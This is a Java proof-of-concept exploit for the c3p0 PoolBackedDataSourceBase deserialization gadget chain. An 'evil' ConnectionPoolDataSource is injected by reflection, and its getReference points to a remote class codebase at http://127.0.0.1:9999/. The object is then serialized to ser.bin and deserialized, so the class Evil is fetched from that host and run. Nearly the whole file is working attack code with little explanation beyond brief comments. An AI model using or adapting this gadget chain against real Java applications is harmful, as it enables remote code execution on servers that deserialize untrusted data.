package URLClassLoaderPoC;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;

public class poc {
    public static void main(String[] args) throws Exception {
        // com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized->getObject
        // PoolBackedDataSourceBase#readObject -> IndirectlySerialized.getObject()
        PoolBackedDataSourceBase a = new PoolBackedDataSourceBase(false);
        Class clazz = Class.forName("com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
        //此类是PoolBackedDataSourceBase抽象类的实现
        Field f1 = clazz.getDeclaredField("connectionPoolDataSource");
        f1.setAccessible(true);
        f1.set(a,new evil());
        serialize(a);
        /*
        In PoolBackedDataSourceBase.writeObject(),
        connectionPoolDataSource will be casted to ReferenceSerialize and it implements IndirectlySerialized!
         */
        deserialize();
    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get("ser.bin")));
        oos.writeObject(obj);
    }
    public static Object deserialize() throws Exception {
        ObjectInputStream ois = new ObjectInputStream(Files.newInputStream(Paths.get("ser.bin")));
        return ois.readObject();
    }
    public static class evil implements ConnectionPoolDataSource, Referenceable {
        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}

        @Override
        public Reference getReference() throws NamingException {
            return new Reference("URLClassLoaderPoC.Evil","URLClassLoaderPoC.Evil","http://127.0.0.1:9999/");
        }
    }
}
